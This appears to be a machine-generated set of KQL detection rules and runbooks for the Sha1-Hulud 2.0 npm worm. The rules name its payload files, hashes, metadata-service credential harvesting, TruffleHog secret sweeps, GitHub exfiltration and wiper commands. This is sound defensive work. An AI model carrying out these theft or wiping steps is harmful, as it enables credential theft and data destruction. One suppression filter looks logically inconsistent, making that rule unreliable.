Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Sha1-Hulud 2.0 npm worm payload files (setup_bun.js / bun_environment.js) written or executed · [LLM] Malicious 'SHA1HULUD' self-hosted GitHub Actions runner installation / persistence
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Cloud IMDS credential harvesting by node/npm/bun during package install (Sha1-Hulud/Megalodon) · [LLM] TruffleHog secret scanner spawned from an npm/bun package-install context (Sha1-Hulud) · [LLM] Sha1-Hulud destructive wiper fallback (cipher /W, recursive del, shred over home dir) · [LLM] CI/dev host exfiltrating to api.github.com shortly after cloud IMDS harvest (Sha1-Hulud exfil chain)
Sha1-Hulud 2.0 npm worm payload files (setup_bun.js / bun_environment.js) written or executed AIInstallation Medium
Hunts for the hardcoded self-propagating payload files the Sha1-Hulud/Megalodon npm worm drops during a malicious package preinstall, matched by exact filename and known SHA256. The article cites Sha1-Hulud dumping harvested credentials into public GitHub repos as the exfiltration destination it warns about; this catches the worm at the execution stage before that exfil happens. Rationale: Uses the exact worm payload filenames (setup_bun.js, bun_environment.js) and four published SHA256 hashes from Datadog/Microsoft analyses of Sha1-Hulud 2.0 — the campaign the article names as the archetype of GitHub-hosted secret exfiltration. Filename+hash makes this alerting-grade. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/ • https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher intentionally detonating a captured Sha1-Hulud sample in a sandbox VONM
  • Threat-intel/malware-repo mirror syncing sample files to a scanning host
  • EDR test/purple-team exercise seeding the named hashes
  • A benign project legitimately shipping a file literally named setup_bun.js (rare; hash filter avoids this)
Suppression filter
| where not (InitiatingProcessFileName in~ ("MsSense.exe","MsMpEng.exe") or FolderPath has_any ("\\MalwareSamples\\","\\Quarantine\\"))
Response runbook
Step 1 (triage): Confirm the SHA256 matches a known worm hash and identify the InitiatingProcess (should be node/npm/bun preinstall). Pull the parent package name and package.json to find the poisoned dependency. Step 2 (contain): Isolate the host/runner, revoke any npm/GitHub/cloud tokens present on it, and freeze the developer's npm publish rights. Step 3 (hunt): Search the org for the same hashes and for any public GitHub repos with description 'Sha1-Hulud: The Second Coming.'; rotate every secret reachable from the affected build.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName in~ ("setup_bun.js","bun_environment.js")
   or SHA256 in~ ("a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a","62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0","cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cd","f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068")
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName in~ ("setup_bun.js","bun_environment.js")
   or TargetFileSHA256 in~ ("a3894003ad1d293ba96d77881ccd2071446dc3f65f434669b49b3da92421901a","62ee164b9b306250c1172583f138c9614139264f889fa99614903c12755468d0","cbb9bc5a8496243e02f3cc080efbe3e4a1430ba0671f2e43a202bf45b05479cd","f099c5d9ec417d4445a0328ac0ada9cde79fc37410914103ae9c609cbc0ee068")
| project TimeGenerated, DvcHostname, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileSHA256, ActorUsername
| order by TimeGenerated desc

Cloud IMDS credential harvesting by node/npm/bun during package install (Sha1-Hulud/Megalodon) AIActions on Objectives Medium
Hunts for a JavaScript package-manager process (node, npm, bun, yarn, pnpm) reaching the cloud instance-metadata service (169.254.169.254 or metadata.google.internal) — the multi-cloud credential-harvest step of the Sha1-Hulud worm. This is the 'secret theft that never touches github.com' the article says public monitoring cannot see. Rationale: Combines the concrete IMDS endpoints (169.254.169.254, metadata.google.internal) documented by Datadog/Unit42 with the JS package-manager parent context that distinguishes worm harvesting from a legitimate cloud SDK call. Pins the abuse to the install-time process rather than any app. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/
ATT&CKT1552.005 T1195.002
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Node.js application running on an EC2/GCE instance that legitimately queries IMDS via the AWS/GCP SDK
  • Serverless/build tooling (e.g. serverless-framework, terraform-node wrappers) resolving instance credentials
  • Cloud-native CI agents written in Node fetching a metadata-scoped token for artifact upload
  • IMDSv2 token-refresh loops from a long-running node service
Suppression filter
| where InitiatingProcessCommandLine has_any ("install","preinstall","postinstall","ci","npx") or InitiatingProcessCommandLine !has "node_modules"
Response runbook
Step 1 (triage): Determine whether the node/bun process was part of an npm/yarn install lifecycle (check parent chain and recent package.json changes) versus a steady-state application. Install-time IMDS access is the true positive. Step 2 (contain): Revoke the instance role's temporary credentials, quarantine the runner/host, and enforce IMDSv2 hop-limit=1 to block the container reach. Step 3 (hunt): Pivot on the host for setup_bun.js/bun_environment.js, trufflehog execution, and any subsequent api.github.com repo creation; rotate cloud keys the role could reach.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "169.254.169.254" or RemoteUrl has "metadata.google.internal"
| where InitiatingProcessFileName in~ ("node.exe","node","npm","npm.cmd","bun","bun.exe","yarn","pnpm")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
| order by Timestamp desc
ASCDeviceEvents
| where TimeGenerated > ago(30d)
| where RemoteIP == "169.254.169.254" or RemoteUrl has "metadata.google.internal"
| where InitiatingProcessFileName in~ ("node.exe","node","npm","npm.cmd","bun","bun.exe","yarn","pnpm")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
| order by TimeGenerated desc

TruffleHog secret scanner spawned from an npm/bun package-install context (Sha1-Hulud) AIActions on Objectives Medium
Hunts for the TruffleHog secret-discovery binary launched as a child of a JavaScript package manager or a shell inside an install script — the on-disk credential-sweep stage of the Sha1-Hulud worm. Distinct from sanctioned CI secret-scanning because the parent is node/npm/bun rather than a dedicated scanner job. Rationale: TruffleHog execution parented by node/bun/npm is the documented Sha1-Hulud secret-discovery step (Datadog/Wiz). The parent-process predicate separates worm-driven scans from an intentional trufflehog CI stage, keeping fidelity up. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
ATT&CKT1552.001 T1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A CI pipeline that legitimately runs trufflehog as a pre-commit/secret-scan step invoked from an npm script
  • Developer running `npx trufflehog` manually to audit a repo
  • Security tooling wrappers that shell out to trufflehog from a Node orchestrator
  • pre-commit framework invoking trufflehog via a node hook
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("pre-commit","secret-scan","security-scan","gitleaks-trufflehog-step"))
Response runbook
Step 1 (triage): Confirm trufflehog was not a sanctioned pipeline step — inspect the initiating package.json script and whether the run coincides with an npm install rather than a scan job. Step 2 (contain): Isolate the host/runner and revoke tokens; if part of a build, halt the pipeline and quarantine produced artifacts. Step 3 (hunt): Correlate with IMDS access, bun payload files, and outbound api.github.com repo creation on the same host; rotate any secrets trufflehog could have read.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName has "trufflehog" or ProcessCommandLine has "trufflehog"
| where InitiatingProcessFileName in~ ("node.exe","node","bun","bun.exe","npm","npm.cmd","yarn","pnpm","sh","bash")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has "trufflehog" or ActingProcessCommandLine has "trufflehog"
| where ParentProcessName has_any ("node","bun","npm","yarn","pnpm","sh","bash")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: TruffleHog Secret Scanner Spawned by Package Manager
